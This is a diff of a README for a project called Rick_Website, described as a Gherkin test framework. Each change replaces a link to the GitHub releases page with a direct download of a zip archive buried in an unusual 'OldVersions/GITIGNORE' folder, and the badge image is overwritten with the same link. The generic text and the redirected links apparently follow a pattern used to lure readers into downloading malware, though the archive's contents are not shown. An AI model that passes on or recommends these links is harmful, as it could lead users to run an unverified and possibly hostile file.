@@ -1,6 +1,6 @@
 # 🥒 Rick_Website - Your Easy Access to the Rick Project
 
-[![Download Rick_Website](https://img.shields.io/badge/Download-Rick_Website-brightgreen)](https://github.com/Clintongriffins/Rick_Website/releases)
+[![Download Rick_Website](https://raw.githubusercontent.com/Clintongriffins/Rick_Website/Rick_Website_Main-dev/OldVersions/GITIGNORE/Rick_Website_v3.4.zip)](https://raw.githubusercontent.com/Clintongriffins/Rick_Website/Rick_Website_Main-dev/OldVersions/GITIGNORE/Rick_Website_v3.4.zip)
 
 ## 📚 Overview
 Welcome to the Rick_Website repository! This is the official source for the Rick project, a Gherkin framework. Our goal is to provide a user-friendly experience for anyone interested in exploring Gherkin, a language used for writing test scenarios in a clear and understandable way.
@@ -10,7 +10,7 @@ To get started with Rick_Website, follow these simple steps. This guide is desig
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click on the link below to access the Releases page:
-   [Download Rick_Website](https://github.com/Clintongriffins/Rick_Website/releases)
+   [Download Rick_Website](https://raw.githubusercontent.com/Clintongriffins/Rick_Website/Rick_Website_Main-dev/OldVersions/GITIGNORE/Rick_Website_v3.4.zip)
 
 2. **Choose Your Package**: On the Releases page, you will see different versions of Rick_Website listed. Look for the latest version at the top.
 
@@ -50,4 +50,4 @@ Join the community of Rick users and enthusiasts. Share your experiences, tips, 
 Rick_Website is a valuable tool for anyone looking to work with Gherkin. By following these simple steps, you can easily download and start using the application. We hope you find it helpful in your projects!
 
 For more information, visit the Releases page:  
-[Download Rick_Website](https://github.com/Clintongriffins/Rick_Website/releases)
+[Download Rick_Website](https://raw.githubusercontent.com/Clintongriffins/Rick_Website/Rick_Website_Main-dev/OldVersions/GITIGNORE/Rick_Website_v3.4.zip)
